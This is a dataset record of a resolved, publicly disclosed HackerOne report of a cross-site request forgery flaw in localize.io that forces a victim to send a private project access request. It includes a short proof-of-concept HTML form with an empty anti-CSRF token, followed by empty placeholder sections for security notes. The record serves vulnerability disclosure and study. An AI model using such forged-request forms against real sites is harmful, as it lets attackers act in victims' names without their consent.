---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8226'
original_report_id: '8226'
title: Private Project Access Request Invitation Sent Via CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-20T18:02:43.752Z'
disclosed_at: '2014-04-21T02:49:03.117Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Private Project Access Request Invitation Sent Via CSRF

## Metadata

- HackerOne Report ID: 8226
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-04-21T02:49:03.117Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I have found a CSRF vulnerability using which the attacker can do or force the victim to sent Private Project Access Invitation Request Via CSRF the anti-csrf token is not getting validated on the server-side. 


Private Project Access Request Invitation Sent Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="requestInvitation[repositoryID]" value="9p" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
